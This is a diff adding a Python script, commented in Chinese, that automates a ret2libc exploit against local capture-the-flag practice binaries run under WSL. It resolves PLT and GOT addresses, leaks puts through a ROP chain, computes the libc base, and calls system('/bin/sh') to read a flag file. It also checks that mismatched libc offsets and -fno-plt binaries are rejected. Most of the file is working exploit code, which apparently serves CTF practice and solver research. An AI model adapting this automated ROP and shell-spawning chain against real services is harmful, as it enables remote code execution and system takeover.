@@ -1,0 +1,466 @@
+"""
+v016_ret2libc.src — ret2libc：泄漏 libc 地址 → 识别版本 → 调 system("/bin/sh")
+
+为什么这是 pwn 的主力
+    真实题里后门函数（win）很少见，更多是"程序里没有 system，但 libc 里有"。
+    所以标准打法是：
+        stage1  调用 puts(puts@got) 泄漏一个 libc 运行时地址
+        stage2  libc 基址 = 泄漏值 − puts 在 libc 里的偏移
+                再拼 system("/bin/sh")
+    这里的核心新能力是 **libc 版本识别**：偏移必须来自题目给的那份 libc，
+    用错版本算出来的基址一定错。
+
+三个新单元
+    1. `plt_stub`     —— 从 .rela.plt 与 .plt 里解析某个导入函数的 PLT 桩地址
+    2. `libc_offsets` —— 从给定的 libc 文件里取 puts / system / "/bin/sh" 的偏移
+    3. `leak_libc`    —— 发起 stage1、解析 6 字节泄漏、算基址并**校验页对齐**
+
+    页对齐校验是识别 libc 版本是否匹配的关键：
+    正确的偏移必然让基址落在页边界（0x...000）上；错版本几乎必然不齐。
+
+测什么
+    L1  正常 ret2libc（无 canary / 无 PIE，隔离出 libc 这一个变量） → 解出
+    N1  **libc 版本不匹配**（故意用错偏移） → 应识别为 `libc_mismatch` 并拒绝
+    N2  用 `-fno-plt` 编译、没有 puts 的 PLT 桩 → 应识别为 `plt_stub_missing` 并拒绝
+
+运行
+    python versions/v016_ret2libc.src
+    python versions/v016_ret2libc.src --only L1
+
+产出物
+    experiments/EXP-0014/{results.json,report.md}
+    experiments/EXP-0014/pwn/{vuln3.c,vuln3,vuln3_noplt,libc.so.6}
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import struct
+import subprocess
+import sys
+import threading
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0014"
+PWN_DIR = OUT_DIR / "pwn"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+EXPECTED = "flag{ret2libc_real}"
+
+
+def wsl_path(win_path: str) -> str:
+    p = Path(win_path).resolve()
+    drive = p.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(p)[2:].replace("\\", "/")
+
+
+# --------------------------------------------------------------------------------------
+# ELF 解析
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    is_pie: bool = False
+    has_canary: bool = False
+    text_addr: int = 0
+    text_data: bytes = b""
+
+
+def elf_info(path: str) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        text = elf.get_section_by_name(".text")
+        return ElfFacts(symbols=symbols, imports=imports,
+                        is_pie=elf["e_type"] == "ET_DYN",
+                        has_canary="__stack_chk_fail" in imports,
+                        text_addr=text["sh_addr"], text_data=text.data())
+
+
+def plt_stub(path: str, symbol: str) -> dict:
+    """解析 .rela.plt 与 .plt，返回该导入函数的 PLT 桩地址和对应 GOT 地址。
+
+    做法：`.rela.plt` 的第 i 项对应 `.plt` 里 `push <i>` 的那个桩。
+    `-fno-plt` 编译的二进制没有 `.plt`，这里会如实返回 not found。
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        plt = elf.get_section_by_name(".plt")
+        rela = elf.get_section_by_name(".rela.plt")
+        if plt is None or rela is None:
+            return {"ok": False, "reason": "plt_or_rela_missing"}
+
+        index_of: dict[int, tuple[str, int]] = {}
+        symtab = elf.get_section(rela["sh_link"])
+        for index, relocation in enumerate(rela.iter_relocations()):
+            symbol_name = ""
+            if relocation["r_info_sym"]:
+                symbol_name = symtab.get_symbol(relocation["r_info_sym"]).name
+            index_of[index] = (symbol_name, relocation["r_offset"])
+
+        engine = Cs(CS_ARCH_X86, CS_MODE_64)
+        stub_start = None
+        target_index = None
+        stubs: dict[int, int] = {}
+        for instruction in engine.disasm(plt.data(), plt["sh_addr"]):
+            if instruction.mnemonic == "endbr64":
+                stub_start = instruction.address
+            elif instruction.mnemonic == "push":
+                # capstone 把 0 渲染成 "0"，不是 "0x0"
+                try:
+                    target_index = int(instruction.op_str, 0)
+                except ValueError:
+                    target_index = None
+            elif target_index is not None and "jmp" in instruction.mnemonic:
+                # capstone 把 `bnd jmp` 渲染成 mnemonic="bnd jmp"
+                if stub_start is not None:
+                    stubs[target_index] = stub_start
+                target_index = None
+
+        # 现代 Ubuntu 默认启用 -z ibtplt：真正的可调用桩在 .plt.sec，
+        # 每个桩是 `endbr64; bnd jmp [rip+X]`，X 指向对应 GOT 项。
+        # 编译器 call 的是 .plt.sec，不是 .plt，所以两个都要解析。
+        plt_sec = elf.get_section_by_name(".plt.sec")
+        got_to_sec: dict[int, int] = {}
+        if plt_sec is not None:
+            sec_stub = None
+            for instruction in engine.disasm(plt_sec.data(), plt_sec["sh_addr"]):
+                if instruction.mnemonic == "endbr64":
+                    sec_stub = instruction.address
+                elif "jmp" in instruction.mnemonic and "rip" in instruction.op_str:
+                    match = re.search(r"\[rip \+ (0x[0-9a-fA-F]+)\]",
+                                      instruction.op_str)
+                    if match and sec_stub is not None:
+                        got = instruction.address + instruction.size + int(
+                            match.group(1), 16)
+                        got_to_sec[got] = sec_stub
+
+    for index, (name, got) in index_of.items():
+        if name == symbol and index in stubs:
+            return {"ok": True, "plt": got_to_sec.get(got, stubs[index]),
+                    "plt_legacy": stubs[index], "plt_sec": got_to_sec.get(got),
+                    "got": got, "index": index}
+    return {"ok": False, "reason": "symbol_not_in_plt"}
+
+
+def libc_offsets(path: str) -> dict:
+    """从给定的 libc 里取 puts / system 的符号偏移，以及 "/bin/sh" 的虚拟地址。"""
+    from elftools.elf.elffile import ELFFile
+
+    raw = Path(path).read_bytes()
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        symbols: dict[str, int] = {}
+        for name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if symbol.name and symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+
+        file_offset = raw.find(b"/bin/sh\x00")
+        if file_offset < 0:
+            return {"ok": False, "reason": "binsh_not_found"}
+        # 把文件偏移换算成虚拟地址
+        binsh_vaddr = None
+        for segment in elf.iter_segments():
+            if segment["p_type"] != "PT_LOAD":
+                continue
+            start = segment["p_offset"]
+            end = start + segment["p_filesz"]
+            if start <= file_offset < end:
+                binsh_vaddr = segment["p_vaddr"] + (file_offset - start)
+                break
+        if binsh_vaddr is None:
+            return {"ok": False, "reason": "binsh_not_mapped"}
+
+    missing = [name for name in ("puts", "system") if name not in symbols]
+    if missing:
+        return {"ok": False, "reason": f"missing:{missing}"}
+    return {"ok": True, "puts": symbols["puts"], "system": symbols["system"],
+            "binsh": binsh_vaddr}
+
+
+def ret_offset(facts: ElfFacts, sink_plts: set[int] | None = None) -> dict:
+    """从反汇编推导返回地址相对缓冲区的偏移（无 canary 情形）。
+
+    只认**调用输入函数（read/gets/scanf/...）的那个函数**：先跟踪函数序言
+    （push rbp）重置缓冲区，再在出现对 sink PLT 的 call 时采用当前函数的
+    `lea rdi, [rbp - X]`。不能全表扫最后一个 lea —— 后面的函数会把偏移带偏。
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    buffer_slot = None
+    for instruction in engine.disasm(facts.text_data, facts.text_addr):
+        if instruction.mnemonic == "push" and instruction.op_str == "rbp":
+            buffer_slot = None
+        elif instruction.mnemonic == "lea":
+            match = re.search(r"\[rbp - (0x[0-9a-fA-F]+|\d+)\]", instruction.op_str)
+            if match:
+                buffer_slot = int(match.group(1), 0)
+        elif instruction.mnemonic == "call" and buffer_slot is not None:
+            try:
+                target = int(instruction.op_str, 0)
+            except ValueError:
+                continue
+            if sink_plts is not None and target in sink_plts:
+                return {"ok": True, "ret_offset": buffer_slot + 8}
+    return {"ok": False}
+
+
+# --------------------------------------------------------------------------------------
+# 交互式进程
+# --------------------------------------------------------------------------------------
+
+class Interactive:
+    def __init__(self, binary_wsl: str) -> None:
+        self.proc = subprocess.Popen(
+            ["wsl", "-e", binary_wsl], stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, bufsize=0)
+        self.buffer = bytearray()
+        self.lock = threading.Lock()
+        threading.Thread(target=self._reader, daemon=True).start()
+
+    def _reader(self) -> None:
+        while True:
+            chunk = self.proc.stdout.read(1)
+            if not chunk:
+                break
+            with self.lock:
+                self.buffer += chunk
+
+    def wait_for(self, marker: bytes, count: int = 1, timeout: float = 8.0) -> bytes:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            with self.lock:
+                if self.buffer.count(marker) >= count:
+                    return bytes(self.buffer)
+            time.sleep(0.005)
+        with self.lock:
+            return bytes(self.buffer)
+
+    def send(self, data: bytes) -> None:
+        self.proc.stdin.write(data)
+        self.proc.stdin.flush()
+
+    def snapshot(self) -> bytes:
+        with self.lock:
+            return bytes(self.buffer)
+
+    def close(self) -> None:
+        try:
+            self.proc.stdin.close()
+        except OSError:
+            pass
+        try:
+            self.proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            self.proc.kill()
+
+
+# --------------------------------------------------------------------------------------
+# 解题
+# --------------------------------------------------------------------------------------
+
+def solve(binary_path: str, libc_path: str, expected: str,
+          fake_puts_offset: int | None = None) -> dict:
+    started = time.perf_counter()
+    steps: list[dict] = []
+
+    facts = elf_info(binary_path)
+    steps.append({"unit": "elf_info", "pie": facts.is_pie, "canary": facts.has_canary})
+    if facts.has_canary or facts.is_pie:
+        return {"solved": False, "reason": "protection_not_handled_here", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    stub = plt_stub(binary_path, "puts")
+    steps.append({"unit": "plt_stub", **{k: (hex(v) if isinstance(v, int)
+                                            and not isinstance(v, bool) else v)
+                                         for k, v in stub.items()}})
+    if not stub["ok"]:
+        return {"solved": False, "reason": "plt_stub_missing", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    offsets = libc_offsets(libc_path)
+    steps.append({"unit": "libc_offsets",
+                  **({k: (hex(v) if isinstance(v, int) and not isinstance(v, bool) else v)
+                      for k, v in offsets.items()})})
+    if not offsets["ok"]:
+        return {"solved": False, "reason": f"libc_invalid:{offsets.get('reason')}",
+                "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    sink_plts = set()
+    for sink in ("read", "gets", "fgets", "scanf", "recv"):
+        sink_stub = plt_stub(binary_path, sink)
+        if sink_stub["ok"]:
+            sink_plts.add(sink_stub["plt"])
+            if sink_stub.get("plt_sec"):
+                sink_plts.add(sink_stub["plt_sec"])
+            if sink_stub.get("plt_legacy"):
+                sink_plts.add(sink_stub["plt_legacy"])
+    layout = ret_offset(facts, sink_plts or None)
+    steps.append({"unit": "ret_offset", **layout})
+    if not layout["ok"]:
+        return {"solved": False, "reason": "ret_offset_not_found", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    padding = b"A" * layout["ret_offset"]
+    pop_rdi = facts.symbols.get("g3_pop_rdi")
+    align_ret = facts.symbols.get("g3_ret")
+    main_addr = facts.symbols.get("main")
+    if not all((pop_rdi, align_ret, main_addr)):
+        return {"solved": False, "reason": "gadget_or_main_missing", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    proc = Interactive(wsl_path(binary_path))
+    try:
+        # stage1: puts(puts@got) 然后回到 main，保持进程活着
+        stage1 = (padding + struct.pack("<Q", pop_rdi) + struct.pack("<Q", stub["got"])
+                  + struct.pack("<Q", stub["plt"]) + struct.pack("<Q", main_addr))
+        proc.wait_for(b"input:")
+        proc.send(stage1)
+        buf = proc.wait_for(b"input:", count=2)
+        cursor = buf.find(b"input:\n") + len(b"input:\n")
+        leaked = struct.unpack("<Q", buf[cursor:cursor + 6] + b"\x00\x00")[0]
+        steps.append({"unit": "leak_libc", "leaked": hex(leaked)})
+
+        puts_offset = fake_puts_offset if fake_puts_offset is not None else offsets["puts"]
+        base = leaked - puts_offset
+        steps.append({"unit": "solve_base", "base": hex(base),
+                      "page_aligned": (base & 0xFFF) == 0})
+        # 版本匹配校验：正确 libc 的偏移必然让基址落在页边界
+        if base & 0xFFF:
+            return {"solved": False, "reason": "libc_mismatch", "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        # stage2: system("/bin/sh")，随后在 shell 里读 flag
+        stage2 = (padding + struct.pack("<Q", align_ret) + struct.pack("<Q", pop_rdi)
+                  + struct.pack("<Q", base + offsets["binsh"])
+                  + struct.pack("<Q", base + offsets["system"]))
+        proc.send(stage2)
+        time.sleep(0.25)
+        proc.send(b"cat /tmp/flag.txt\n")
+        time.sleep(0.5)
+        text = proc.snapshot().decode("utf-8", "replace")
+        found = FLAG_RE.search(text)
+        ok = bool(found and found.group(0).lower() == expected.lower())
+        steps.append({"unit": "execute", "result": "solved" if ok else "failed"})
+        return {"solved": ok, "reason": None if ok else "shell_failed", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+    finally:
+        proc.close()
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="ret2libc")
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    subprocess.run(["wsl", "-e", "bash", "-lc", f"printf '{EXPECTED}\\n' > /tmp/flag.txt"],
+                   timeout=30, capture_output=True)
+
+    binary = PWN_DIR / "vuln3"
+    noplt = PWN_DIR / "vuln3_noplt"
+    libc = PWN_DIR / "libc.so.6"
+
+    cases = [
+        ("L1", str(binary), str(libc), None, False),
+        # N1：模拟 libc 版本不匹配（偏移错误 → 基址不对齐）
+        ("N1", str(binary), str(libc), 0x12345, True),
+        # N2：-fno-plt 编译，没有 puts 的 PLT 桩
+        ("N2", str(noplt), str(libc), None, True),
+    ]
+
+    rows: list[dict] = []
+    for tid, bin_path, libc_path, fake, negative in cases:
+        if args.only and tid != args.only:
+            continue
+        if not Path(bin_path).exists():
+            log(f"  {tid}: 跳过（靶场不存在：{bin_path}）")
+            continue
+        result = solve(bin_path, libc_path, EXPECTED, fake)
+        row = {"id": tid, "negative": negative, **result}
+        rows.append(row)
+        if negative:
+            verdict = "OK(如实拒绝)" if not row["solved"] else "UNEXPECTED"
+        else:
+            verdict = "OK" if row["solved"] else "FAILED"
+        log(f"  {tid}: {verdict:12} {row.get('reason') or '':20} "
+            f"{row['elapsed_ms']}ms")
+
+    positives = [r for r in rows if not r["negative"]]
+    negatives = [r for r in rows if r["negative"]]
+    summary = {
+        "positive_total": len(positives),
+        "positive_solved": sum(1 for r in positives if r["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_refused": sum(1 for r in negatives if not r["solved"]),
+        "mean_elapsed_ms": round(sum(r["elapsed_ms"] for r in rows) / max(len(rows), 1), 1),
+    }
+    log("汇总：" + json.dumps(summary, ensure_ascii=False))
+
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "rows": rows}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0014 — ret2libc", "",
+             "两阶段：`puts(puts@got)` 泄漏 → 算 libc 基址 → `system(\"/bin/sh\")`。", "",
+             "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "", "| 题 | 类型 | 结果 | 原因 | 耗时 |",
+             "| --- | --- | --- | --- | --- |"]
+    for row in rows:
+        if row["negative"]:
+            mark = "✓ 如实拒绝" if not row["solved"] else "✗ 不该解出"
+            kind = "负样本"
+        else:
+            mark = "✓ 解出" if row["solved"] else "✗ 失败"
+            kind = "正样本"
+        lines.append(f"| {row['id']} | {kind} | {mark} | {row.get('reason') or '—'} "
+                     f"| {row['elapsed_ms']}ms |")
+    (OUT_DIR / "report.md").write_text("\n".join(lines), encoding="utf-8")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
